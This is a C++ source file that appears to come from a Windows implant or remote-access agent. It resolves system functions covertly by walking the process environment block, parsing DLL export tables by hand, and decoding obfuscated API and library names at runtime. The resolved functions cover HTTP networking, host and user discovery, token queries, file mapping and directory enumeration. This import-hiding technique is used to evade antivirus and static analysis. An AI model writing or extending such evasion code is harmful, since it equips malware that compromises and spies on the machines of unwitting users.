#include <windows.h>
#include <wchar.h>
#include <winternl.h>
#include "utils/buffer.h"
#include "constants.h"
#include "utils/winapi.h"
#include "utils/string_aggregator.h"

/* Global */
HMODULE hNtdll = NULL;

/* Helper methods */

HMODULE GetModuleHandleCustom(PCHAR moduleName)
{
	// Get PEB from GS register (for x64) or FS register (for x86)
#ifdef _WIN64
	PPEB pPeb = (PPEB)((PBYTE)(__readgsqword(96)));
#elif _WIN32
	PPEB pPeb = (PPEB)((PBYTE)(__readfsdword(48)));
#endif

	// Convert module name from ASCII to Unicode
	WCHAR moduleNameW[MAX_PATH * sizeof(WCHAR)];
	Utf8ToWideString(moduleName, moduleNameW);

	// Cycle through modules and select the necessary one
	LIST_ENTRY listEntry = pPeb->Ldr->InMemoryOrderModuleList;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)listEntry.Flink;
	PLDR_DATA_TABLE_ENTRY pDataTableEntryFirst = (PLDR_DATA_TABLE_ENTRY)listEntry.Flink;
	WCHAR dllNameCurrLower[MAX_PATH];
	WCHAR moduleNameWLower[MAX_PATH];

	RtlZeroMemoryCustom((PBYTE)moduleNameWLower, MAX_PATH);
	WideStringToLower(moduleNameW, moduleNameWLower);

	while (TRUE)
	{
		// If current module's name matches, return address to it
		RtlZeroMemoryCustom((PBYTE)dllNameCurrLower, MAX_PATH);
		WideStringToLower(pDataTableEntry->FullDllName.Buffer, dllNameCurrLower);
		if (lstrcmpW(dllNameCurrLower, moduleNameWLower) == 0)
		{
			return (HMODULE)pDataTableEntry->Reserved2[0];
		}

		// Move to next entry
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pDataTableEntry->Reserved1[0];

		// Break if we reach first element of the circular linked list
		if (pDataTableEntry == pDataTableEntryFirst)
		{
			break;
		}
	}

	// If execution comes here, it means module was not found
	return NULL;
}

PVOID GetProcAddressCustom(HMODULE hModule, PCHAR procName)
{
	// Get length of Procedure name
	DWORD procNameSize = StrLen(procName);

	// Get export data directory
	PBYTE pModuleBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pModuleBase + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(pModuleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD pAddressOfNames = (PDWORD)(pModuleBase + (pDirectoryExport->AddressOfNames));
	PWORD pAddressOfOrdinals = (PWORD)(pModuleBase + (pDirectoryExport->AddressOfNameOrdinals));
	PDWORD pAddressOfFunctions = (PDWORD)(pModuleBase + (pDirectoryExport->AddressOfFunctions));
	PVOID pProc = NULL;

	// Prepare strings for forwarded functions check
	CHAR strNtdllDot[STRING_NTDLL_DOT_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_NTDLL_DOT,
		STRING_NTDLL_DOT_LEN,
		strNtdllDot);

	for (int i = 0; i < pDirectoryExport->NumberOfNames; i++)
	{
		PCHAR procNameCurr = (PCHAR)pModuleBase + pAddressOfNames[i];

		if (CompareBuffer(procNameCurr, procName, procNameSize))
		{
			pProc = (PVOID)(pModuleBase + pAddressOfFunctions[pAddressOfOrdinals[i]]);

			// Check for forwarded function; if found, resolve it recursively
			if (CompareBuffer(pProc, strNtdllDot, STRING_NTDLL_DOT_LEN))
			{
				return GetProcAddressCustom(hNtdll, (PCHAR)pProc + STRING_NTDLL_DOT_LEN);
			}

			// If not a forwarded function, return found pointer directly
			else
				return pProc;
		}
	}

	return NULL;
}

HMODULE LoadLibraryCustom(IN PCHAR moduleName)
{
	// Check if library is already loaded; if yes, return its handle
	HMODULE hModuleExisting = GetModuleHandleCustom(moduleName);
	if (hModuleExisting != NULL)
	{
		return hModuleExisting;
	}

	// If library is not already loaded, load it and then return its handle
	else
	{
		// Get handle to Kernel32.dll
		CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = "";
		DeobfuscateUtf8String(
			(PCHAR)STRING_KERNEL32_DLL,
			STRING_KERNEL32_DLL_LEN,
			strKernel32Dll);
		HMODULE hKernel32 = GetModuleHandleCustom(strKernel32Dll);
		if (hKernel32 == NULL)
		{
			return (HMODULE)0;
		}

		// Get LoadLibraryA() address
		CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = "";
		DeobfuscateUtf8String(
			(PCHAR)STRING_LOAD_LIBRARY_A,
			STRING_LOAD_LIBRARY_A_LEN,
			strLoadLibraryA);
		PVOID pLoadLibraryA = GetProcAddressCustom(hKernel32, strLoadLibraryA);
		if (pLoadLibraryA == NULL)
		{
			return (HMODULE)0;
		}
		HMODULE (*LoadLibraryA)(PCHAR moduleName) = (HMODULE(*)(PCHAR))pLoadLibraryA;

		// Use LoadLibraryA
		return LoadLibraryA(moduleName);
	}
}

DWORD FreeLibraryCustom(IN HMODULE hModule)
{
	// Get handle to Kernel32.dll
	CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNEL32_DLL,
		STRING_KERNEL32_DLL_LEN,
		strKernel32Dll);
	HMODULE hKernel32 = GetModuleHandleCustom(strKernel32Dll);
	if (hKernel32 == NULL)
	{
		return GetLastError();
	}

	// Get FreeLibrary() address
	CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_FREE_LIBRARY,
		STRING_FREE_LIBRARY_LEN,
		strFreeLibrary);
	PVOID pFreeLibrary = GetProcAddressCustom(hKernel32, strFreeLibrary);
	if (pFreeLibrary == NULL)
	{
		return GetLastError();
	}
	BOOL (*FreeLibrary)(HMODULE hLibModule) = (BOOL(*)(HMODULE))pFreeLibrary;

	// Use FreeLibrary
	if (!FreeLibrary(hModule))
	{
		return GetLastError();
	}

	return 0;
}

/* Class for WinAPI functions */
WinApiCustom::WinApiCustom()
{
	// Get necessary strings for modules
	static CHAR strNtdllDll[STRING_NTDLL_DLL_LEN + 1] = ""; // "ntdll.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NTDLL_DLL,
		STRING_NTDLL_DLL_LEN,
		strNtdllDll);

	static CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = ""; // "Kernel32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNEL32_DLL,
		STRING_KERNEL32_DLL_LEN,
		strKernel32Dll);

	static CHAR strKernelbaseDll[STRING_KERNELBASE_DLL_LEN + 1] = ""; // "kernelbase.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNELBASE_DLL,
		STRING_KERNELBASE_DLL_LEN,
		strKernelbaseDll);

	static CHAR strUser32Dll[STRING_USER32_DLL_LEN + 1] = ""; // "User32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_USER32_DLL,
		STRING_USER32_DLL_LEN,
		strUser32Dll);

	static CHAR strWininetDll[STRING_WININET_DLL_LEN + 1] = ""; // "Wininet.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WININET_DLL,
		STRING_WININET_DLL_LEN,
		strWininetDll);

	static CHAR strBcryptDll[STRING_BCRYPT_DLL_LEN + 1] = ""; // "Bcrypt.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_DLL,
		STRING_BCRYPT_DLL_LEN,
		strBcryptDll);

	static CHAR strAdvapi32Dll[STRING_ADVAPI32_DLL_LEN + 1] = ""; // "Advapi32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_ADVAPI32_DLL,
		STRING_ADVAPI32_DLL_LEN,
		strAdvapi32Dll);

	// Get necessary strings for functions
	static CHAR strMessageBoxA[STRING_MESSAGEBOX_A_LEN + 1] = ""; // "MessageBoxA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MESSAGEBOX_A,
		STRING_MESSAGEBOX_A_LEN,
		strMessageBoxA);

	static CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = ""; // "LoadLibraryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOAD_LIBRARY_A,
		STRING_LOAD_LIBRARY_A_LEN,
		strLoadLibraryA);

	static CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = ""; // "FreeLibrary"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FREE_LIBRARY,
		STRING_FREE_LIBRARY_LEN,
		strFreeLibrary);

	static CHAR strInternetOpenA[STRING_INTERNET_OPEN_A_LEN + 1] = ""; // "InternetOpenA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_OPEN_A,
		STRING_INTERNET_OPEN_A_LEN,
		strInternetOpenA);

	static CHAR strInternetConnectA[STRING_INTERNET_CONNECT_A_LEN + 1] = ""; // "InternetConnectA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_CONNECT_A,
		STRING_INTERNET_CONNECT_A_LEN,
		strInternetConnectA);

	static CHAR strHttpOpenRequestA[STRING_HTTP_OPEN_REQUEST_A_LEN + 1] = ""; // "HttpOpenRequestA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HTTP_OPEN_REQUEST_A,
		STRING_HTTP_OPEN_REQUEST_A_LEN,
		strHttpOpenRequestA);

	static CHAR strHttpSendRequestA[STRING_HTTP_SEND_REQUEST_A_LEN + 1] = ""; // "HttpSendRequestA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HTTP_SEND_REQUEST_A,
		STRING_HTTP_SEND_REQUEST_A_LEN,
		strHttpSendRequestA);

	static CHAR strInternetReadFile[STRING_INTERNET_READ_FILE_LEN + 1] = ""; // "InternetReadFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_READ_FILE,
		STRING_INTERNET_READ_FILE_LEN,
		strInternetReadFile);

	static CHAR strInternetCloseHandle[STRING_INTERNET_CLOSE_HANDLE_LEN + 1] = ""; // "InternetCloseHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_CLOSE_HANDLE,
		STRING_INTERNET_CLOSE_HANDLE_LEN,
		strInternetCloseHandle);

	static CHAR strInternetSetOptionA[STRING_INTERNET_SET_OPTION_A_LEN + 1] = ""; // "InternetSetOptionA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_SET_OPTION_A,
		STRING_INTERNET_SET_OPTION_A_LEN,
		strInternetSetOptionA);

	static CHAR strGetProcessHeap[STRING_GET_PROCESS_HEAP_LEN + 1] = ""; // "GetProcessHeap"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_PROCESS_HEAP,
		STRING_GET_PROCESS_HEAP_LEN,
		strGetProcessHeap);

	static CHAR strHeapAlloc[STRING_HEAP_ALLOC_LEN + 1] = ""; // "HeapAlloc"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_ALLOC,
		STRING_HEAP_ALLOC_LEN,
		strHeapAlloc);

	static CHAR strHeapReAlloc[STRING_HEAP_RE_ALLOC_LEN + 1] = ""; // "HeapReAlloc"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_RE_ALLOC,
		STRING_HEAP_RE_ALLOC_LEN,
		strHeapReAlloc);

	static CHAR strHeapFree[STRING_HEAP_FREE_LEN + 1] = ""; // "HeapFree"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_FREE,
		STRING_HEAP_FREE_LEN,
		strHeapFree);

	static CHAR strGetLastError[STRING_GET_LAST_ERROR_LEN + 1] = ""; // "GetLastError"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_LAST_ERROR,
		STRING_GET_LAST_ERROR_LEN,
		strGetLastError);

	static CHAR strBCryptOpenAlgorithmProvider[STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER_LEN + 1] = ""; // "BCryptOpenAlgorithmProvider"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER,
		STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER_LEN,
		strBCryptOpenAlgorithmProvider);

	static CHAR strBCryptCloseAlgorithmProvider[STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER_LEN + 1] = ""; // "BCryptCloseAlgorithmProvider"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER,
		STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER_LEN,
		strBCryptCloseAlgorithmProvider);

	static CHAR strBCryptGenRandom[STRING_BCRYPT_GEN_RANDOM_LEN + 1] = ""; // "BCryptGenRandom"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_GEN_RANDOM,
		STRING_BCRYPT_GEN_RANDOM_LEN,
		strBCryptGenRandom);

	static CHAR strCreateThread[STRING_CREATE_THREAD_LEN + 1] = ""; // "CreateThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_THREAD,
		STRING_CREATE_THREAD_LEN,
		strCreateThread);

	static CHAR strCreateMutexA[STRING_CREATE_MUTEX_A_LEN + 1] = ""; // "CreateMutexA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_MUTEX_A,
		STRING_CREATE_MUTEX_A_LEN,
		strCreateMutexA);

	static CHAR strWaitForSingleObject[STRING_WAIT_FOR_SINGLE_OBJECT_LEN + 1] = ""; // "WaitForSingleObject"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WAIT_FOR_SINGLE_OBJECT,
		STRING_WAIT_FOR_SINGLE_OBJECT_LEN,
		strWaitForSingleObject);

	static CHAR strReleaseMutex[STRING_RELEASE_MUTEX_LEN + 1] = ""; // "ReleaseMutex"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RELEASE_MUTEX,
		STRING_RELEASE_MUTEX_LEN,
		strReleaseMutex);

	static CHAR strCloseHandle[STRING_CLOSE_HANDLE_LEN + 1] = ""; // "CloseHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CLOSE_HANDLE,
		STRING_CLOSE_HANDLE_LEN,
		strCloseHandle);

	static CHAR strCreateEventA[STRING_CREATE_EVENT_A_LEN + 1] = ""; // "CreateEventA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_EVENT_A,
		STRING_CREATE_EVENT_A_LEN,
		strCreateEventA);

	static CHAR strSetEvent[STRING_SET_EVENT_LEN + 1] = ""; // "SetEvent"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_EVENT,
		STRING_SET_EVENT_LEN,
		strSetEvent);

	static CHAR strResetEvent[STRING_RESET_EVENT_LEN + 1] = ""; // "ResetEvent"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RESET_EVENT,
		STRING_RESET_EVENT_LEN,
		strResetEvent);

	static CHAR strGetComputerNameExA[STRING_GET_COMPUTER_NAME_EX_A_LEN + 1] = ""; // "GetComputerNameExA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_COMPUTER_NAME_EX_A,
		STRING_GET_COMPUTER_NAME_EX_A_LEN,
		strGetComputerNameExA);

	static CHAR strOpenProcessToken[STRING_OPEN_PROCESS_TOKEN_LEN + 1] = ""; // "OpenProcessToken"
	DeobfuscateUtf8String(
		(PCHAR)STRING_OPEN_PROCESS_TOKEN,
		STRING_OPEN_PROCESS_TOKEN_LEN,
		strOpenProcessToken);

	static CHAR strGetTokenInformation[STRING_GET_TOKEN_INFORMATION_LEN + 1] = ""; // "GetTokenInformation"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_TOKEN_INFORMATION,
		STRING_GET_TOKEN_INFORMATION_LEN,
		strGetTokenInformation);

	static CHAR strLookupAccountSidA[STRING_LOOKUP_ACCOUNT_SID_A_LEN + 1] = ""; // "LookupAccountSidA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOOKUP_ACCOUNT_SID_A,
		STRING_LOOKUP_ACCOUNT_SID_A_LEN,
		strLookupAccountSidA);

	static CHAR strGetCurrentDirectoryA[STRING_GET_CURRENT_DIRECTORY_A_LEN + 1] = ""; // "GetCurrentDirectoryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_CURRENT_DIRECTORY_A,
		STRING_GET_CURRENT_DIRECTORY_A_LEN,
		strGetCurrentDirectoryA);

	static CHAR strSetCurrentDirectoryA[STRING_SET_CURRENT_DIRECTORY_A_LEN + 1] = ""; // "SetCurrentDirectoryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_SET_CURRENT_DIRECTORY_A,
		STRING_SET_CURRENT_DIRECTORY_A_LEN,
		strSetCurrentDirectoryA);

	static CHAR strCreateFileA[STRING_CREATE_FILE_A_LEN + 1] = ""; // "CreateFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_FILE_A,
		STRING_CREATE_FILE_A_LEN,
		strCreateFileA);

	static CHAR strGetFileSizeEx[STRING_GET_FILE_SIZE_EX_LEN + 1] = ""; // "GetFileSizeEx"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_FILE_SIZE_EX,
		STRING_GET_FILE_SIZE_EX_LEN,
		strGetFileSizeEx);

	static CHAR strCreateFileMappingA[STRING_CREATE_FILE_MAPPING_A_LEN + 1] = ""; // "CreateFileMappingA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_FILE_MAPPING_A,
		STRING_CREATE_FILE_MAPPING_A_LEN,
		strCreateFileMappingA);

	static CHAR strMapViewOfFile[STRING_MAP_VIEW_OF_FILE_LEN + 1] = ""; // "MapViewOfFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MAP_VIEW_OF_FILE,
		STRING_MAP_VIEW_OF_FILE_LEN,
		strMapViewOfFile);

	static CHAR strUnmapViewOfFile[STRING_UNMAP_VIEW_OF_FILE_LEN + 1] = ""; // "UnmapViewOfFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_UNMAP_VIEW_OF_FILE,
		STRING_UNMAP_VIEW_OF_FILE_LEN,
		strUnmapViewOfFile);

	static CHAR strFlushViewOfFile[STRING_FLUSH_VIEW_OF_FILE_LEN + 1] = ""; // "FlushViewOfFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FLUSH_VIEW_OF_FILE,
		STRING_FLUSH_VIEW_OF_FILE_LEN,
		strFlushViewOfFile);

	static CHAR strFlushFileBuffers[STRING_FLUSH_FILE_BUFFERS_LEN + 1] = ""; // "FlushFileBuffers"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FLUSH_FILE_BUFFERS,
		STRING_FLUSH_FILE_BUFFERS_LEN,
		strFlushFileBuffers);

	static CHAR strGetSecurityInfo[STRING_GET_SECURITY_INFO_LEN + 1] = ""; // "GetSecurityInfo"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_SECURITY_INFO,
		STRING_GET_SECURITY_INFO_LEN,
		strGetSecurityInfo);

	static CHAR strLocalFree[STRING_LOCAL_FREE_LEN + 1] = ""; // "LocalFree"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOCAL_FREE,
		STRING_LOCAL_FREE_LEN,
		strLocalFree);

	static CHAR strFindFirstFileA[STRING_FIND_FIRST_FILE_A_LEN + 1] = ""; // "FindFirstFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FIND_FIRST_FILE_A,
		STRING_FIND_FIRST_FILE_A_LEN,
		strFindFirstFileA);

	static CHAR strFindNextFileA[STRING_FIND_NEXT_FILE_A_LEN + 1] = ""; // "FindNextFileA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FIND_NEXT_FILE_A,
		STRING_FIND_NEXT_FILE_A_LEN,
		strFindNextFileA);

	static CHAR strFindClose[STRING_FIND_CLOSE_LEN + 1] = ""; // "FindClose"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FIND_CLOSE,
		STRING_FIND_CLOSE_LEN,
		strFindClose);

	// Load necessary modules
	loadedModules.hNtdll = LoadLibraryCustom(strNtdllDll);
	loadedModules.hKernelbase = LoadLibraryCustom(strKernelbaseDll);
	loadedModules.hKernel32 = LoadLibraryCustom(strKernel32Dll);
	loadedModules.hUser32 = LoadLibraryCustom(strUser32Dll);
	loadedModules.hWininet = LoadLibraryCustom(strWininetDll);
	loadedModules.hBcrypt = LoadLibraryCustom(strBcryptDll);
	loadedModules.hAdvapi32 = LoadLibraryCustom(strAdvapi32Dll);

	// Save necessary global module handles
	hNtdll = loadedModules.hNtdll;

	// Load necessary functions
	loadedFunctions.MessageBoxA = (int (*)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddressCustom(loadedModules.hUser32, strMessageBoxA);
	loadedFunctions.LoadLibraryA = (HMODULE(*)(LPCSTR lpLibFileName))GetProcAddressCustom(loadedModules.hKernel32, strLoadLibraryA);
	loadedFunctions.FreeLibrary = (BOOL(*)(HMODULE hLibModule))GetProcAddressCustom(loadedModules.hKernel32, strFreeLibrary);
	loadedFunctions.InternetOpenA = (HINTERNET(*)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags))GetProcAddressCustom(loadedModules.hWininet, strInternetOpenA);
	loadedFunctions.InternetConnectA = (HINTERNET(*)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext))GetProcAddressCustom(loadedModules.hWininet, strInternetConnectA);
	loadedFunctions.HttpOpenRequestA = (HINTERNET(*)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)) GetProcAddressCustom(loadedModules.hWininet, strHttpOpenRequestA);
	loadedFunctions.HttpSendRequestA = (BOOL(*)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength))GetProcAddressCustom(loadedModules.hWininet, strHttpSendRequestA);
	loadedFunctions.InternetReadFile = (BOOL(*)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead))GetProcAddressCustom(loadedModules.hWininet, strInternetReadFile);
	loadedFunctions.InternetCloseHandle = (BOOL(*)(HINTERNET hInternet))GetProcAddressCustom(loadedModules.hWininet, strInternetCloseHandle);
	loadedFunctions.InternetSetOptionA = (BOOL(*)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength))GetProcAddressCustom(loadedModules.hWininet, strInternetSetOptionA);
	loadedFunctions.GetProcessHeap = (HANDLE(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetProcessHeap);
	loadedFunctions.HeapAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapAlloc);
	loadedFunctions.HeapReAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapReAlloc);
	loadedFunctions.HeapFree = (BOOL(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem))GetProcAddressCustom(loadedModules.hKernel32, strHeapFree);
	loadedFunctions.GetLastError = (DWORD(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetLastError);
	loadedFunctions.BCryptOpenAlgorithmProvider = (NTSTATUS(*)(BCRYPT_ALG_HANDLE * phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags)) GetProcAddressCustom(loadedModules.hBcrypt, strBCryptOpenAlgorithmProvider);
	loadedFunctions.BCryptCloseAlgorithmProvider = (NTSTATUS(*)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags))GetProcAddressCustom(loadedModules.hBcrypt, strBCryptCloseAlgorithmProvider);
	loadedFunctions.BCryptGenRandom = (NTSTATUS(*)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags))GetProcAddressCustom(loadedModules.hBcrypt, strBCryptGenRandom);
	loadedFunctions.CreateThread = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId))GetProcAddressCustom(loadedModules.hKernel32, strCreateThread);
	loadedFunctions.CreateMutexA = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateMutexA);
	loadedFunctions.WaitForSingleObject = (DWORD(*)(HANDLE hHandle, DWORD dwMilliseconds))GetProcAddressCustom(loadedModules.hKernel32, strWaitForSingleObject);
	loadedFunctions.ReleaseMutex = (BOOL(*)(HANDLE hMutex))GetProcAddressCustom(loadedModules.hKernel32, strReleaseMutex);
	loadedFunctions.CloseHandle = (BOOL(*)(HANDLE hObject))GetProcAddressCustom(loadedModules.hKernel32, strCloseHandle);
	loadedFunctions.CreateEventA = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateEventA);
	loadedFunctions.SetEvent = (BOOL(*)(HANDLE hEvent))GetProcAddressCustom(loadedModules.hKernel32, strSetEvent);
	loadedFunctions.ResetEvent = (BOOL(*)(HANDLE hEvent))GetProcAddressCustom(loadedModules.hKernel32, strResetEvent);
	loadedFunctions.GetComputerNameExA = (BOOL(*)(IN COMPUTER_NAME_FORMAT NameType, OUT LPSTR lpBuffer, IN OUT LPDWORD nSize))GetProcAddressCustom(loadedModules.hKernel32, strGetComputerNameExA);
	loadedFunctions.OpenProcessToken = (BOOL(*)(IN HANDLE ProcessHandle, IN DWORD DesiredAccess, OUT PHANDLE TokenHandle))GetProcAddressCustom(loadedModules.hAdvapi32, strOpenProcessToken);
	loadedFunctions.GetTokenInformation = (BOOL(*)(IN HANDLE TokenHandle, IN TOKEN_INFORMATION_CLASS TokenInformationClass, OUT LPVOID TokenInformation, IN DWORD TokenInformationLength, OUT PDWORD ReturnLength))GetProcAddressCustom(loadedModules.hAdvapi32, strGetTokenInformation);
	loadedFunctions.LookupAccountSidA = (BOOL(*)(IN LPCSTR lpSystemName, IN PSID Sid, OUT LPSTR Name, IN LPDWORD cchName, OUT LPSTR ReferencedDomainName, IN OUT LPDWORD cchReferencedDomainName, OUT PSID_NAME_USE peUse))GetProcAddressCustom(loadedModules.hAdvapi32, strLookupAccountSidA);
	loadedFunctions.CreateFileA = (HANDLE(*)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile))GetProcAddressCustom(loadedModules.hKernel32, strCreateFileA);
	loadedFunctions.CreateFileMappingA = (HANDLE(*)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateFileMappingA);
	loadedFunctions.MapViewOfFile = (LPVOID(*)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap))GetProcAddressCustom(loadedModules.hKernel32, strMapViewOfFile);
	loadedFunctions.GetFileSizeEx = (BOOL(*)(HANDLE hFile, PLARGE_INTEGER lpFileSize))GetProcAddressCustom(loadedModules.hKernel32, strGetFileSizeEx);
	loadedFunctions.UnmapViewOfFile = (BOOL(*)(LPCVOID lpBaseAddress))GetProcAddressCustom(loadedModules.hKernel32, strUnmapViewOfFile);
	loadedFunctions.FlushViewOfFile = (BOOL(*)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush))GetProcAddressCustom(loadedModules.hKernel32, strFlushViewOfFile);
	loadedFunctions.FlushFileBuffers = (BOOL(*)(HANDLE hFile))GetProcAddressCustom(loadedModules.hKernel32, strFlushFileBuffers);
	loadedFunctions.GetCurrentDirectoryA = (DWORD(*)(DWORD nBufferLength, PCHAR lpBuffer))GetProcAddressCustom(loadedModules.hKernel32, strGetCurrentDirectoryA);
	loadedFunctions.SetCurrentDirectoryA = (BOOL(*)(PCHAR lpPathName))GetProcAddressCustom(loadedModules.hKernel32, strSetCurrentDirectoryA);
	loadedFunctions.GetSecurityInfo = (DWORD(*)(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID * ppsidOwner, PSID * ppsidGroup, PACL * ppDacl, PACL * ppSacl, PSECURITY_DESCRIPTOR * ppSecurityDescriptor)) GetProcAddressCustom(loadedModules.hAdvapi32, strGetSecurityInfo);
	loadedFunctions.LocalFree = (HLOCAL(*)(HLOCAL hMem))GetProcAddressCustom(loadedModules.hKernel32, strLocalFree);
	loadedFunctions.FindFirstFileA = (HANDLE(*)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData))GetProcAddressCustom(loadedModules.hKernel32, strFindFirstFileA);
	loadedFunctions.FindNextFileA = (BOOL(*)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData))GetProcAddressCustom(loadedModules.hKernel32, strFindNextFileA);
	loadedFunctions.FindClose = (BOOL(*)(HANDLE hFindFile))GetProcAddressCustom(loadedModules.hKernel32, strFindClose);
}

/* Destructor for WinApiCustom */
